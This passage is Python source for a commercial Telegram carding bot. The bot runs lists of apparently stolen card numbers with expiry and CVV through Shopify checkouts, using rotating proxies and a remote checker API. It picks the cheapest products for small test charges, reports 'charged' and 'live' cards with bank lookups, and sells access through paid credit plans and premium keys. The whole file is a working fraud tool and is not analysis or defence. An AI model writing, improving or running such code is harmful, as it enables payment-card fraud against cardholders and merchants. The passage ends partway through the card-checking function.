from telethon import TelegramClient, events, Button
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.errors import UserNotParticipantError, ChatAdminRequiredError
import asyncio
import aiohttp
import aiofiles
import aiosqlite
import os
import random
import time
import json
import re
import string
from datetime import datetime, timedelta
from dotenv import load_dotenv

load_dotenv()

# ========== CONFIGURATION (from environment) ==========
API_ID   = int(os.getenv('API_ID', '0'))
API_HASH = os.getenv('API_HASH', '')
BOT_TOKEN = os.getenv('BOT_TOKEN', '')
ADMIN_IDS = [int(x) for x in os.getenv('ADMIN_IDS', '').split(',') if x.strip()]
OWNER_ID = ADMIN_IDS[0] if ADMIN_IDS else 0  # First admin is the owner
PVT_CHANNEL_ID = int(os.getenv('PVT_CHANNEL_ID', '0'))
DB_FILE = os.getenv('DB_FILE', 'credits.db')
API_ENDPOINTS = [
    (ep.rstrip('/') + '/shopify') if not ep.rstrip('/').endswith('/shopify') else ep
    for ep in (x.strip() for x in os.getenv('API_ENDPOINTS', '').split(',') if x.strip())
]
MASS_CHECK_WORKERS = int(os.getenv('MASS_CHECK_WORKERS', '20'))

REQUIRED_CHATS = [
    {"link": "https://t.me/hexaxcheckerupdates", "id": None},
    {"link": "https://t.me/hexaxcheckerfeedback", "id": None},
    {"link": "https://t.me/hexaxcheckerchat", "id": None},
]

PLANS = {
    "trial":    {"days": 1,  "credits": 3000,  "price": "2$",  "name": "🎁 TRIAL"},
    "bronze":   {"days": 3,  "credits": 8000,  "price": "4$",  "name": "🥉 BRONZE"},
    "silver":   {"days": 7,  "credits": 14000, "price": "8$",  "name": "🥈 SILVER"},
    "gold":     {"days": 14, "credits": 20000, "price": "12$", "name": "🥇 GOLD"},
    "platinum": {"days": 24, "credits": 30000, "price": "22$", "name": "💎 PLATINUM"},
}

PREMIUM_FILE    = 'premium.json'
KEYS_FILE       = 'keys.json'
CREDIT_KEYS_FILE = 'credit_keys.json'
SITES_FILE      = 'sites.txt'
PROXY_FILE      = 'proxy.txt'
BANNED_FILE     = 'banned.txt'

SITE_FILTERS = {
    "all":     {"name": "📋 All Sites",   "min": 0, "max": 999999},
    "under5":  {"name": "💰 Under $5",    "min": 0, "max": 5},
    "under10": {"name": "💰 Under $10",   "min": 0, "max": 10},
    "under15": {"name": "💰 Under $15",   "min": 0, "max": 15},
    "under20": {"name": "💰 Under $20",   "min": 0, "max": 20},
    "under30": {"name": "💰 Under $30",   "min": 0, "max": 30},
}

PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088", "🔥": "5999340396432333728", "❌": "6037570896766438989",
    "⚡": "6026367225466720832", "💳": "5971944878815317190", "💠": "5971837723676249096",
    "📝": "6023660820544623088", "🌐": "6026367225466720832", "🎯": "5974235702701853774",
    "🤖": "6057466460886799210", "🤵": "4949560993840629085", "💰": "5971944878815317190",
    "⏸️": "6001440193058444284", "▶️": "6285315214673975495", "🛑": "5420323339723881652",
    "📊": "5971837723676249096", "📦": "6066395745139824604", "📋": "5974235702701853774",
    "🔄": "5971837723676249096", "⏳": "5971837723676249096", "🚀": "6282977077427702833",
    "⚠️": "5420323339723881652", "💎": "6023660820544623088",
}

def premium_emoji(text):
    if not text:
        return text
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

bot = TelegramClient('hexaxshchkrx_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}
ACTIVE_FILTER = "all"
_cache_warmup_in_progress = False
_cache_warmup_total = 0
_cache_warmup_done = 0

# ========== HEALTH-AWARE LOAD BALANCER ==========
_healthy_endpoints: set = set()
_endpoint_lock = asyncio.Lock()
_endpoint_index = 0

async def health_check_loop():
    while True:
        for ep in API_ENDPOINTS:
            base = ep.rsplit('/', 1)[0]
            health_url = base + '/health'
            try:
                timeout = aiohttp.ClientTimeout(total=5)
                async with aiohttp.ClientSession(timeout=timeout) as s:
                    async with s.get(health_url) as r:
                        if r.status == 200:
                            _healthy_endpoints.add(ep)
                        else:
                            _healthy_endpoints.discard(ep)
            except Exception:
                _healthy_endpoints.discard(ep)
        await asyncio.sleep(30)

async def get_next_healthy_endpoint():
    global _endpoint_index
    async with _endpoint_lock:
        pool = list(_healthy_endpoints) if _healthy_endpoints else list(API_ENDPOINTS)
        if not pool:
            raise Exception("No API endpoints available")
        ep = pool[_endpoint_index % len(pool)]
        _endpoint_index += 1
        return ep

async def call_checker_api(params, max_tries=3):
    last_exc = None
    for _ in range(max_tries):
        try:
            ep = await get_next_healthy_endpoint()
            timeout = aiohttp.ClientTimeout(total=120)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(ep, params=params) as resp:
                    body = await resp.text()
                    if resp.status >= 400:
                        body_stripped = body.strip()
                        if body_stripped.startswith('<'):
                            raise Exception(f"Endpoint returned HTML (HTTP {resp.status})")
                        raise Exception(f"HTTP {resp.status}: {body_stripped[:120]}")
                    try:
                        return json.loads(body)
                    except json.JSONDecodeError:
                        if body.strip().startswith('<'):
                            raise Exception("Endpoint returned HTML instead of JSON")
                        raise Exception(f"Invalid JSON response: {body[:120]}")
        except Exception as e:
            last_exc = e
    raise Exception(f"All API endpoints failed: {last_exc}")


async def call_product_price_api(site: str, proxy: str = None, max_tries: int = 2) -> dict:
    """Call /product_price on a healthy API endpoint (load-balanced)."""
    last_exc = None
    for _ in range(max_tries):
        try:
            shopify_ep = await get_next_healthy_endpoint()
            # Derive /product_price URL from the /shopify endpoint
            if shopify_ep.endswith('/shopify'):
                ep = shopify_ep[:-len('/shopify')] + '/product_price'
            else:
                ep = shopify_ep.rstrip('/') + '/product_price'
            params: dict = {'site': site}
            if proxy:
                params['proxy'] = proxy
            timeout = aiohttp.ClientTimeout(total=30)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(ep, params=params) as resp:
                    body = await resp.text()
                    return json.loads(body)
        except Exception as e:
            last_exc = e
    raise Exception(f"product_price API failed: {last_exc}")

async def call_products_api(site: str, proxy: str = None, max_price: float = None, max_tries: int = 2) -> dict:
    """Call /products API endpoint to get all variants under price cap."""
    last_exc = None
    for _ in range(max_tries):
        try:
            shopify_ep = await get_next_healthy_endpoint()
            # Derive /products URL from the /shopify endpoint
            if shopify_ep.endswith('/shopify'):
                ep = shopify_ep[:-len('/shopify')] + '/products'
            else:
                ep = shopify_ep.rstrip('/') + '/products'
            params: dict = {'site': site}
            if proxy:
                params['proxy'] = proxy
            if max_price is not None:
                params['max_price'] = max_price
            timeout = aiohttp.ClientTimeout(total=30)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(ep, params=params) as resp:
                    body = await resp.text()
                    return json.loads(body)
        except Exception as e:
            last_exc = e
    raise Exception(f"products API failed: {last_exc}")

# ========== SQLITE CREDITS ==========
_credits_lock = asyncio.Lock()

async def init_db():
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute(
            'CREATE TABLE IF NOT EXISTS credits '
            '(user_id TEXT PRIMARY KEY, amount INTEGER DEFAULT 0)'
        )
        await db.commit()

async def get_user_credits(user_id):
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute(
            'SELECT amount FROM credits WHERE user_id = ?', (str(user_id),)
        ) as cur:
            row = await cur.fetchone()
            return row[0] if row else 0

async def add_credits(user_id, amount):
    async with _credits_lock:
        async with aiosqlite.connect(DB_FILE) as db:
            await db.execute(
                'INSERT INTO credits (user_id, amount) VALUES (?, ?) '
                'ON CONFLICT(user_id) DO UPDATE SET amount = amount + ?',
                (str(user_id), amount, amount)
            )
            await db.commit()
    return True

async def remove_credits(user_id, amount):
    async with _credits_lock:
        async with aiosqlite.connect(DB_FILE) as db:
            async with db.execute(
                'SELECT amount FROM credits WHERE user_id = ?', (str(user_id),)
            ) as cur:
                row = await cur.fetchone()
            current = row[0] if row else 0
            new_amount = max(0, current - amount)
            await db.execute(
                'INSERT INTO credits (user_id, amount) VALUES (?, ?) '
                'ON CONFLICT(user_id) DO UPDATE SET amount = ?',
                (str(user_id), new_amount, new_amount)
            )
            await db.commit()
    return True

async def deduct_credit(user_id):
    async with _credits_lock:
        async with aiosqlite.connect(DB_FILE) as db:
            async with db.execute(
                'SELECT amount FROM credits WHERE user_id = ?', (str(user_id),)
            ) as cur:
                row = await cur.fetchone()
            current = row[0] if row else 0
            if current >= 1:
                new_amount = current - 1
                await db.execute(
                    'UPDATE credits SET amount = ? WHERE user_id = ?',
                    (new_amount, str(user_id))
                )
                await db.commit()
                return True, new_amount
            return False, current

async def get_total_credits():
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute('SELECT SUM(amount) FROM credits') as cur:
            row = await cur.fetchone()
            return row[0] or 0

async def get_all_credit_user_ids():
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute('SELECT user_id FROM credits') as cur:
            rows = await cur.fetchall()
            return [int(r[0]) for r in rows]

async def _zero_credits_on_expiry(user_id):
    async with _credits_lock:
        async with aiosqlite.connect(DB_FILE) as db:
            await db.execute(
                'UPDATE credits SET amount = 0 WHERE user_id = ?', (str(user_id),)
            )
            await db.commit()

# ========== CREDIT KEYS SYSTEM ==========
def load_credit_keys():
    if not os.path.exists(CREDIT_KEYS_FILE):
        return {}
    try:
        with open(CREDIT_KEYS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return {}

def save_credit_keys(keys_data):
    try:
        with open(CREDIT_KEYS_FILE, 'w', encoding='utf-8') as f:
            json.dump(keys_data, f, indent=4)
    except Exception:
        pass

def generate_credit_key(amount):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    keys_data = load_credit_keys()
    keys_data[key] = {
        'credits': amount,
        'used': False,
        'created_at': datetime.now().isoformat()
    }
    save_credit_keys(keys_data)
    return key

async def redeem_credit_key(key, user_id):
    keys_data = load_credit_keys()
    if key not in keys_data:
        return False, "Invalid credit key"
    if keys_data[key]['used']:
        return False, "Key already used"

    credits = keys_data[key]['credits']
    await add_credits(user_id, credits)

    keys_data[key]['used'] = True
    keys_data[key]['used_by'] = user_id
    keys_data[key]['used_at'] = datetime.now().isoformat()
    save_credit_keys(keys_data)
    return True, credits

# ========== PREMIUM KEYS SYSTEM ==========
def load_keys():
    if not os.path.exists(KEYS_FILE):
        return {}
    try:
        with open(KEYS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return {}

def save_keys(keys_data):
    try:
        with open(KEYS_FILE, 'w', encoding='utf-8') as f:
            json.dump(keys_data, f, indent=4)
    except Exception:
        pass

def generate_premium_key(plan_key, days, credits):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    keys_data = load_keys()
    keys_data[key] = {
        'type': 'premium',
        'plan': plan_key,
        'days': days,
        'credits': credits,
        'used': False,
        'created_at': datetime.now().isoformat()
    }
    save_keys(keys_data)
    return key

def load_premium_users():
    if not os.path.exists(PREMIUM_FILE):
        return {}
    try:
        with open(PREMIUM_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return {}

def save_premium_users(premium_data):
    try:
        with open(PREMIUM_FILE, 'w', encoding='utf-8') as f:
            json.dump(premium_data, f, indent=4)
    except Exception:
        pass

def is_premium(user_id):
    premium_data = load_premium_users()
    user_data = premium_data.get(str(user_id))
    if not user_data:
        return False
    expiry = datetime.fromisoformat(user_data['expiry'])
    if datetime.now() > expiry:
        del premium_data[str(user_id)]
        save_premium_users(premium_data)
        try:
            loop = asyncio.get_running_loop()
            loop.create_task(_zero_credits_on_expiry(user_id))
        except RuntimeError:
            pass
        return False
    return True

def get_user_plan_name(user_id):
    premium_data = load_premium_users()
    user_data = premium_data.get(str(user_id))
    if not user_data:
        return "FREE"
    plan_key = user_data.get('plan_key', '')
    if plan_key and plan_key in PLANS:
        return PLANS[plan_key]['name']
    return "CUSTOM"

async def add_premium_user(user_id, plan_key, days, credits):
    premium_data = load_premium_users()
    expiry = datetime.now() + timedelta(days=days)
    premium_data[str(user_id)] = {
        'expiry': expiry.isoformat(),
        'added_at': datetime.now().isoformat(),
        'days': days,
        'credits': credits,
        'plan_key': plan_key
    }
    save_premium_users(premium_data)
    await add_credits(user_id, credits)

async def redeem_premium_key(key, user_id):
    keys_data = load_keys()
    if key not in keys_data:
        return False, "Invalid premium key"
    if keys_data[key]['used']:
        return False, "Key already used"
    if is_premium(user_id):
        return False, "You already have premium access"

    days = keys_data[key]['days']
    credits = keys_data[key]['credits']
    plan_key = keys_data[key]['plan']

    await add_premium_user(user_id, plan_key, days, credits)

    keys_data[key]['used'] = True
    keys_data[key]['used_by'] = user_id
    keys_data[key]['used_at'] = datetime.now().isoformat()
    save_keys(keys_data)

    if plan_key == 'custom':
        return True, f"Redeemed custom premium: {days} days + {credits} credits!"
    else:
        return True, f"Redeemed {PLANS[plan_key]['name']} plan! {days} days + {credits} credits!"

# ========== RESOLVE CHAT IDs ==========
async def resolve_chat_ids():
    for chat in REQUIRED_CHATS:
        try:
            entity = await bot.get_entity(chat["link"])
            chat["id"] = entity.id
            print(f"Resolved: {chat['link']} -> {entity.id}")
        except Exception as e:
            print(f"Failed to resolve {chat['link']}: {e}")

# ========== JOIN CHECK WITH GetParticipantRequest ==========
_join_cache: dict = {}
_JOIN_CACHE_TTL = 300  # 5 minutes

async def check_user_joined(user_id):
    now = time.time()
    if user_id in _join_cache:
        cached_time, result = _join_cache[user_id]
        if now - cached_time < _JOIN_CACHE_TTL:
            return result

    missing_chats = []
    for chat in REQUIRED_CHATS:
        if chat["id"] is None:
            continue
        try:
            await bot(GetParticipantRequest(chat["id"], user_id))
        except UserNotParticipantError:
            missing_chats.append(chat["link"])
        except ChatAdminRequiredError:
            pass  # assume joined if bot lacks permission
        except Exception:
            pass

    result = (not missing_chats, missing_chats if missing_chats else None)
    _join_cache[user_id] = (now, result)
    return result

# ========== HELPER FUNCTIONS ==========
def is_admin(user_id):
    return user_id in ADMIN_IDS

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception:
        return []

def load_banned_users():
    return get_file_lines(BANNED_FILE)

def is_banned(user_id):
    return str(user_id) in load_banned_users()

def ban_user(user_id):
    with open(BANNED_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{user_id}\n")

def unban_user(user_id):
    banned = load_banned_users()
    if str(user_id) in banned:
        banned.remove(str(user_id))
        with open(BANNED_FILE, 'w', encoding='utf-8') as f:
            for uid in banned:
                f.write(f"{uid}\n")

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

# ========== PROXY SPEED CACHE ==========
_proxy_speed_cache: dict = {}  # {proxy_str: avg_response_ms}

# ========== PROXY SCORING SYSTEM ==========
# Combines latency and success rate for intelligent proxy selection
_proxy_scores: dict = {}  # {proxy_str: {"latency": float, "success": int, "total": int}}

def update_proxy_score(proxy: str, success: bool, latency_ms: float = None):
    """Update proxy performance metrics."""
    if proxy not in _proxy_scores:
        _proxy_scores[proxy] = {"latency": 5000.0, "success": 0, "total": 0}

    score = _proxy_scores[proxy]
    score["total"] += 1
    if success:
        score["success"] += 1

    if latency_ms is not None:
        # Exponential moving average for latency
        alpha = 0.3
        score["latency"] = alpha * latency_ms + (1 - alpha) * score["latency"]

def get_proxy_score(proxy: str) -> float:
    """Calculate composite score: lower is better. Combines latency and success rate."""
    if proxy not in _proxy_scores:
        return 10000.0  # High penalty for unknown proxies

    score = _proxy_scores[proxy]
    if score["total"] == 0:
        return 10000.0

    success_rate = score["success"] / score["total"]
    latency = score["latency"]

    # Weighted score: 70% success rate (inverted), 30% latency
    # Lower is better: high success rate (low failure) + low latency = low score
    composite = (1.0 - success_rate) * 7000 + latency * 0.3
    return composite

def choose_best_proxies(proxies: list, n: int = 3) -> list:
    """Return up to n best proxies based on composite score."""
    if not proxies:
        return []

    # Score all proxies
    scored = [(p, get_proxy_score(p)) for p in proxies]
    scored.sort(key=lambda x: x[1])  # Sort by score (lower is better)

    return [p for p, _ in scored[:n]]

# ========== API CONCURRENCY SEMAPHORE ==========
# Controls max simultaneous in-flight API requests from the bot.
# Defined here (before any function that uses it) for clarity.
_api_semaphore = asyncio.Semaphore(MASS_CHECK_WORKERS)

def _make_proxy_dict(proxy_str: str) -> dict:
    """Convert a proxy string to a curl_cffi-compatible proxies dict."""
    if not proxy_str:
        return {}
    if "://" in proxy_str:
        return {"http": proxy_str, "https": proxy_str}
    parts = proxy_str.split(":")
    if len(parts) == 2:
        url = f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        ip, port, user, password = parts
        url = f"http://{user}:{password}@{ip}:{port}"
    else:
        return {}
    return {"http": url, "https": url}

def _choose_fastest_proxies(proxies: list, n: int = 3) -> list:
    """Return up to *n* proxies sorted by speed (fastest first).
    Unrated proxies are placed after rated ones."""
    rated = [(p, _proxy_speed_cache[p]) for p in proxies if p in _proxy_speed_cache]
    unrated = [p for p in proxies if p not in _proxy_speed_cache]
    rated.sort(key=lambda x: x[1])
    ordered = [p for p, _ in rated] + unrated
    return ordered[:n] if ordered else []

# ========== PRICE-BASED SITE CACHE ==========
_site_price_cache: dict = {}   # {site_url: (timestamp, min_price_or_none)}
_PRICE_CACHE_TTL = 3600        # 1 hour

# ========== PRODUCT VARIANT CACHE ==========
# Caches all available variants per site for intelligent product selection
_product_cache: dict = {}  # {site_url: {"timestamp": float, "variants": [{"variant_id": str, "price": float}, ...]}}
_PRODUCT_CACHE_TTL = 1800  # 30 minutes

async def fetch_and_cache_products(site_url: str, max_price: float = None) -> list:
    """
    Fetch all variants for a site from the /products API and cache them.
    Returns list of variant dicts: [{"variant_id": "123", "price": 10.50}, ...]
    """
    domain = site_url if site_url.startswith("http") else f"https://{site_url}"
    proxies_pool = load_proxies()
    proxy = choose_best_proxies(proxies_pool, n=1)[0] if proxies_pool else None

    try:
        async with _api_semaphore:
            result = await call_products_api(domain, proxy=proxy, max_price=max_price)

        if "error" in result:
            return []

        variants = result.get("variants", [])
        if not variants:
            return []

        # Convert to simplified format
        variant_list = []
        for v in variants:
            try:
                variant_list.append({
                    "variant_id": v["variant_id"],
                    "price": float(v["price"])
                })
            except (KeyError, ValueError, TypeError):
                continue

        # Cache the results
        _product_cache[site_url] = {
            "timestamp": time.time(),
            "variants": variant_list
        }

        return variant_list

    except Exception:
        return []

def get_cached_products(site_url: str) -> list:
    """Get cached variants for a site if fresh enough."""
    cached = _product_cache.get(site_url)
    if not cached:
        return []

    # Check if cache is stale
    if time.time() - cached["timestamp"] > _PRODUCT_CACHE_TTL:
        return []

    return cached.get("variants", [])

async def get_random_variant_for_site(site_url: str, max_price: float = None) -> str | None:
    """
    Get a random variant_id from cached products for this site.
    If cache is empty/stale, fetch fresh products.
    Returns variant_id or None if no products available.
    """
    variants = get_cached_products(site_url)

    # Refresh cache if empty or stale
    if not variants:
        variants = await fetch_and_cache_products(site_url, max_price=max_price)

    if not variants:
        return None

    # Filter by max_price if specified
    if max_price is not None:
        variants = [v for v in variants if v["price"] <= max_price]

    if not variants:
        return None

    # Pick random variant
    chosen = random.choice(variants)
    return chosen["variant_id"]

async def _fetch_cheapest_price(site_url: str) -> float | None:
    """Fetch cheapest available product price via the API's /product_price endpoint.
    Uses the same load-balanced, health-aware API pool as card checks.
    Picks the fastest available proxy so warmup works reliably."""
    domain = site_url if site_url.startswith("http") else f"https://{site_url}"
    proxies_pool = load_proxies()
    proxy = _choose_fastest_proxies(proxies_pool, n=1)[0] if proxies_pool else None
    try:
        async with _api_semaphore:
            result = await call_product_price_api(domain, proxy=proxy)
        if "error" in result:
            return None
        price = result.get("price")
        if price is not None:
            return float(price)
        return None
    except Exception:
        return None

async def get_site_cheapest_price(site_url: str) -> float | None:
    """Return cached cheapest price or fetch if stale/missing."""
    now = time.time()
    if site_url in _site_price_cache:
        cached_ts, cached_price = _site_price_cache[site_url]
        if now - cached_ts < _PRICE_CACHE_TTL:
            return cached_price
    price = await _fetch_cheapest_price(site_url)
    _site_price_cache[site_url] = (now, price)
    return price

async def load_filtered_sites() -> list:
    """Return only sites whose price is cached and within the active filter range.
    When a non-'all' filter is active, uncached or out-of-range sites are excluded."""
    all_sites = load_sites()
    if ACTIVE_FILTER == "all":
        return all_sites
    flt = SITE_FILTERS[ACTIVE_FILTER]
    min_p, max_p = flt["min"], flt["max"]
    filtered = []
    for site in all_sites:
        cached = _site_price_cache.get(site)
        if cached is None:
            continue  # skip: price not yet cached
        _, cached_price = cached
        if cached_price is not None and min_p <= cached_price <= max_p:
            filtered.append(site)
    return filtered

async def warm_price_cache(sites: list, notify_chat_id: int = None):
    """Background task: fetch cheapest price for all sites and populate cache."""
    global _cache_warmup_in_progress, _cache_warmup_total, _cache_warmup_done
    _cache_warmup_in_progress = True
    _cache_warmup_total = len(sites)
    _cache_warmup_done = 0

    sem = asyncio.Semaphore(MASS_CHECK_WORKERS)

    async def _fetch_with_sem(site):
        async with sem:
            return await get_site_cheapest_price(site)

    batch = 30
    for i in range(0, len(sites), batch):
        tasks = [_fetch_with_sem(s) for s in sites[i:i+batch]]
        await asyncio.gather(*tasks, return_exceptions=True)
        _cache_warmup_done = min(i + batch, len(sites))
        await asyncio.sleep(0.5)

    _cache_warmup_done = _cache_warmup_total
    _cache_warmup_in_progress = False

    if notify_chat_id:
        flt = SITE_FILTERS[ACTIVE_FILTER]
        min_p, max_p = flt["min"], flt["max"]
        matched = sum(
            1 for site in sites
            if site in _site_price_cache
            and _site_price_cache[site][1] is not None
            and min_p <= _site_price_cache[site][1] <= max_p
        )
        if matched == 0 and ACTIVE_FILTER != "all":
            msg = (
                f"⚠️ <b>No sites could be cached for {flt['name']}.</b>\n\n"
                f"This usually means all proxies failed to reach <code>/products.json</code>.\n"
                f"Check your proxies with /proxy and /proxyspeed."
            )
        else:
            msg = (
                f"✅ <b>Cache ready!</b> <b>{matched}</b> sites match "
                f"<b>{flt['name']}</b>. You can now check cards."
            )
        try:
            await bot.send_message(notify_chat_id, premium_emoji(msg), parse_mode='html')
        except Exception:
            pass

def add_site(site_url):
    sites = load_sites()
    if site_url in sites:
        return False, "Site already exists"
    with open(SITES_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{site_url}\n")
    return True, "Site added successfully"

def add_sites_bulk(site_urls):
    current_sites = load_sites()
    added = []
    already = []
    for site in site_urls:
        if site not in current_sites:
            added.append(site)
        else:
            already.append(site)
    if added:
        with open(SITES_FILE, 'a', encoding='utf-8') as f:
            for site in added:
                f.write(f"{site}\n")
    return added, already

def remove_site(site_url):
    sites = load_sites()
    if site_url not in sites:
        return False, "Site not found"
    new_sites = [s for s in sites if s != site_url]
    with open(SITES_FILE, 'w', encoding='utf-8') as f:
        for site in new_sites:
            f.write(f"{site}\n")
    return True, "Site removed successfully"

# ========== REALTIME HIT NOTIFICATION ==========
async def send_realtime_hit_to_user(user_id, hit_type, card, response_msg, gateway, price):
    if hit_type == "CHARGED":
        status_emoji = "✅"
        status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
    else:
        status_emoji = "🔥"
        status_text = "𝐋𝐢𝐯𝐞"

    bin_num = card.split('|')[0][:6]
    brand, bin_type, level, bank, country, flag = await get_bin_info(bin_num)

    message = f"""<b>⚡💳 #𝐒𝐇𝐎𝐏𝐈𝐅𝐘 💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>
<blockquote>{status_emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{card}</code></blockquote>
<blockquote>📝 Response: {response_msg[:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway} | 💰 {price}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot made by UNKNOWNENTITY <a href="https://t.me/Unknow0nentity">@Unknow0nentity</a> TELEGRAM</b>"""

    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except Exception as e:
        print(f"Error sending hit to user: {e}")

# ========== PVT CHANNEL LOG ==========
async def send_log_to_channel(response_msg, gateway, price, username, user_id):
    header = "⭐ CHARGED HIT ⭐"
    user_display = username if username else str(user_id)
    plan_name = get_user_plan_name(user_id)

    log_message = f"""<b>{header}</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>Response ━</b> {response_msg[:100]}
<b>Gateway ━</b> {gateway}
<b>Price ━</b> {price}
<b>━━━━━━━━━━━━━━━━━</b>
<b>User ━</b> <a href="tg://user?id={user_id}">{user_display}</a> ({plan_name} USER)"""

    try:
        await bot.send_message(PVT_CHANNEL_ID, premium_emoji(log_message), parse_mode='html')
    except Exception as e:
        print(f"Error sending log to PVT channel: {e}")

# ========== DEAD INDICATORS (SITE-LEVEL ERRORS ONLY) ==========
# CRITICAL: Only site-level failures that prevent checkout, NOT card declines
# Card declines (DECLINED, INSUFFICIENT_FUNDS, etc.) prove the site is WORKING
_DEAD_INDICATORS = (
    # Site configuration errors
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'url rejected', 'malformed input',

    # Connection/network failures
    'cloudflare', 'connection failed', 'timed out', 'timeout',
    'tlsv1 alert', 'ssl routines', 'ssl error', 'openssl ssl_connect',
    'could not resolve', 'domain name not found', 'name or service not known',
    'empty reply from server', 'network error', 'connection reset',
    'unreachable', 'access denied',

    # HTTP errors
    'httperror504', 'http error', 'http 404',
    '502', '503', '504', 'bad gateway', 'service unavailable', 'gateway timeout',
    '429', 'too many requests', 'rate limit', 'rate limited',

    # API/checkout flow errors
    'error in 1st req', 'error in 1 req',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'generic_error', 'empty_submit_response',

    # Price/product issues
    'no_product_in_price_range', 'zero_dollar_order', 'zero dollar', 'price is zero',
    'amount_too_small', 'amount too small',

    # Site dead indicators
    'site dead', 'site errors', 'site error',
    'captcha_required', 'captcha required',
    'not found', 'checkout is not valid', 'checkout not valid',
    'test mode only', 'test mode', 'empty body', 'empty response',

    # Delivery/address errors (site config issues)
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
)

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                data = await res.json()
                return (
                    data.get('brand', '-'),
                    data.get('type', '-'),
                    data.get('level', '-'),
                    data.get('bank', '-'),
                    data.get('country_name', '-'),
                    data.get('country_flag', ''),
                )
    except Exception:
        return '-', '-', '-', '-', '-', ''

# ========== SIMPLIFIED CARD CHECKER ==========
async def check_card(card, site, proxy, use_variant_cache=True):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {
                'status': 'Invalid Format',
                'message': 'Invalid card format',
                'card': card,
                'refund_credit': True,
            }

        params = {'cc': card, 'site': site, 'proxy': proxy}

        # NEW: Optionally fetch a random variant from cache to avoid out-of-stock issues
        if use_variant_cache:
            max_price = None
            if ACTIVE_FILTER != "all":
                flt_max = SITE_FILTERS[ACTIVE_FILTER]["max"]
                if flt_max < 999999:
                    max_price = flt_max

            variant_id = await get_random_variant_for_site(site, max_price=max_price)
            if variant_id:
                params['variant'] = variant_id
            else:
                # No cached variants available, pass max_price to API
                if max_price is not None:
                    params['max_price'] = max_price
        else:
            # Legacy mode: let API fetch products
            if ACTIVE_FILTER != "all":
                flt_max = SITE_FILTERS[ACTIVE_FILTER]["max"]
                if flt_max < 999999:
                    params['max_price'] = flt_max

        raw = await call_checker_api(params)

        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        gateway = raw.get('Gateway', 'Shopify Payments')
        api_status = raw.get('Status', False)

        # Guard: zero-dollar orders are site errors — refund credit
        try:
            if isinstance(price, (int, float)) and float(price) == 0.0:
                return {
                    'status': 'Site Error',
                    'message': 'Zero-dollar order (site misconfiguration)',
                    'card': card,
                    'site': site,
                    'gateway': gateway,
                    'price': price,
                    'refund_credit': True,
                }
        except (ValueError, TypeError):
            pass

        # Site has no product in the user's price range — refund and skip.
        if 'no_product_in_price_range' in str(response_msg).lower():
            return {
                'status': 'Dead',
                'message': 'No product in price range',
                'card': card,
                'site': site,
                'gateway': gateway,
                'price': '-',
                'refund_credit': True,
            }

        if is_dead_site_error(response_msg):
            return {
                'status': 'Site Error', 'message': response_msg, 'card': card,
